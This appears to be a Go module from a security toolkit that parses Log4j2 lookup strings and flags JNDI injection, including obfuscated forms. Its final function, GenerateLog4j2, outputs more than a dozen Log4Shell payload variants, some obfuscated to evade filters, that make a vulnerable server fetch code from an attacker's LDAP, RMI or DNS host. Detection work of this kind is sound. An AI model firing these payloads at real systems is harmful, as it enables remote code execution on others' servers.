package btt

import (
	"regexp"
	"strings"
)

// Log4j2Lookup 一条 ${...} lookup 表达式的解析结果
type Log4j2Lookup struct {
	Raw      string `json:"raw"`      // 原始表达式
	Prefix   string `json:"prefix"`   // lookup 前缀: jndi/env/sys/java/lower/upper/date/main/bundle...
	Value    string `json:"value"`    // lookup 参数
	Protocol string `json:"protocol"` // jndi 目标协议: ldap/rmi/dns/...
	Target   string `json:"target"`   // jndi 目标地址
	Danger   bool   `json:"danger"`   // 是否为可利用的 JNDI 注入
}

var reLookup = regexp.MustCompile(`\$\{`)

// log4j2DangerousPrefixes 危险前缀
var dangerousPrefixes = map[string]bool{
	"jndi": true,
}

var benignPrefixes = map[string]bool{
	"lower": true, "upper": true, "env": true, "sys": true, "java": true,
	"date": true, "main": true, "bundle": true, "ctx": true, "log4j": true,
	"map": true, "sd": true, "base64": true, "hostname": true,
}

// extractLookups 递归提取所有 ${...} 表达式（支持嵌套）
func extractLookups(s string) []string {
	var out []string
	depth := 0
	start := -1
	for i := 0; i < len(s); i++ {
		if s[i] == '$' && i+1 < len(s) && s[i+1] == '{' {
			if depth == 0 {
				start = i
			}
			depth++
			i++
			continue
		}
		if s[i] == '}' && depth > 0 {
			depth--
			if depth == 0 && start >= 0 {
				out = append(out, s[start:i+1])
				start = -1
			}
		}
	}
	// 再提取嵌套内层
	for _, e := range out {
		inner := e[2 : len(e)-1]
		if strings.Contains(inner, "${") {
			out = append(out, extractLookups(inner)...)
		}
	}
	return out
}

// resolveExpr 解析单个 ${prefix:value} 表达式
func resolveExpr(expr string) Log4j2Lookup {
	l := Log4j2Lookup{Raw: expr}
	body := expr
	if strings.HasPrefix(body, "${") && strings.HasSuffix(body, "}") {
		body = body[2 : len(body)-1]
	}
	idx := strings.Index(body, ":")
	if idx < 0 {
		l.Prefix = body
		return l
	}
	l.Prefix = strings.ToLower(strings.TrimSpace(body[:idx]))
	l.Value = body[idx+1:]

	// 处理 ${prefix:-default} 默认值语法
	if strings.HasPrefix(l.Value, ":-") {
		l.Value = l.Value[2:]
	}

	if l.Prefix == "jndi" {
		l.Danger = true
		v := l.Value
		if i := strings.Index(v, ":"); i >= 0 {
			l.Protocol = strings.ToLower(v[:i])
		}
		// ${jndi:ldap://host:port/path}
		t := v
		if i := strings.Index(t, "://"); i >= 0 {
			t = t[i+3:]
		}
		l.Target = t
	}
	return l
}

// ParseLog4j2 解析文本中的 ${...} lookup 表达式，返回结构化结果与风险结论
func ParseLog4j2(payload string) ([]Log4j2Lookup, bool) {
	exprs := extractLookups(payload)
	if len(exprs) == 0 {
		return nil, false
	}
	var out []Log4j2Lookup
	danger := false
	for _, e := range exprs {
		l := resolveExpr(e)
		// 嵌套表达式（如 ${lower:j}ndi:...）拼回整体再判一次
		if !l.Danger && strings.Contains(e, "${") {
			flat := flattenLookup(e)
			if strings.Contains(strings.ToLower(flat), "jndi:") {
				l.Danger = true
				inner := resolveExpr(flat)
				l.Protocol = inner.Protocol
				l.Target = inner.Target
				l.Prefix = "jndi(obfuscated)"
			}
		}
		if l.Danger {
			danger = true
		}
		out = append(out, l)
	}
	return out, danger
}

// flattenLookup 将 ${lower:x}${upper:y}${::-z} 类混淆表达式拼平
func flattenLookup(expr string) string {
	body := strings.TrimPrefix(strings.TrimSuffix(expr, "}"), "${")
	var b strings.Builder
	i := 0
	for i < len(body) {
		if body[i] == '$' && i+1 < len(body) && body[i+1] == '{' {
			end := findClosing(body, i)
			if end < 0 {
				break
			}
			inner := body[i+2 : end]
			colon := strings.Index(inner, ":")
			var prefix, val string
			if colon >= 0 {
				prefix = strings.ToLower(inner[:colon])
				val = inner[colon+1:]
			} else {
				prefix = strings.ToLower(inner)
			}
			switch {
			case prefix == "lower":
				b.WriteString(strings.ToLower(val))
			case prefix == "upper":
				b.WriteString(strings.ToUpper(val))
			case strings.HasPrefix(val, "-"):
				// ${xxx:-default} → default
				b.WriteString(strings.TrimPrefix(val, "-"))
			case prefix == "env" || prefix == "sys" || prefix == "java":
				// ${env:FOO:-bar} → bar
				if j := strings.Index(val, ":-"); j >= 0 {
					b.WriteString(val[j+2:])
				}
			default:
				b.WriteString(flattenLookup("${" + inner + "}"))
			}
			i = end + 1
			continue
		}
		b.WriteByte(body[i])
		i++
	}
	return b.String()
}

func findClosing(s string, from int) int {
	depth := 0
	for i := from; i < len(s); i++ {
		if s[i] == '$' && i+1 < len(s) && s[i+1] == '{' {
			depth++
			i++
		} else if s[i] == '}' {
			depth--
			if depth == 0 {
				return i
			}
		}
	}
	return -1
}

// GenerateLog4j2 生成 log4j2 JNDI 注入 payload 变体
func GenerateLog4j2(target string) []string {
	if target == "" {
		target = "ldap://127.0.0.1:1389/Exploit"
	}
	if !strings.Contains(target, "://") {
		target = "ldap://" + target
	}
	host := target[strings.Index(target, "://")+3:]

	variants := []string{
		"${jndi:" + target + "}",
		"${${lower:J}${upper:NDI}:" + target + "}",
		"${${lower:j}${lower:n}${lower:d}${lower:i}:" + target + "}",
		"${${::-j}${::-n}${::-d}${::-i}:" + target + "}",
		"${${env:NaN:-j}ndi${env:NaN:-:}" + target + "}",
		"${jndi:ldap://" + host + "}",
		"${${lower:jndi}:${lower:ldap}://" + host + "}",
		"${jndi:rmi://" + host + "}",
		"${jndi:dns://" + host + "}",
		"${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap://" + host + "}",
		"${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}dap://" + host + "}",
		"${jndi:ldap://" + host + ".java.naming.factory.initial}",
		"${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:" + target + "}",
		"${${main:''}j${main:''}n${main:''}d${main:''}i:" + target + "}",
	}
	var out []string
	for _, v := range variants {
		out = append(out, v)
	}
	return out
}
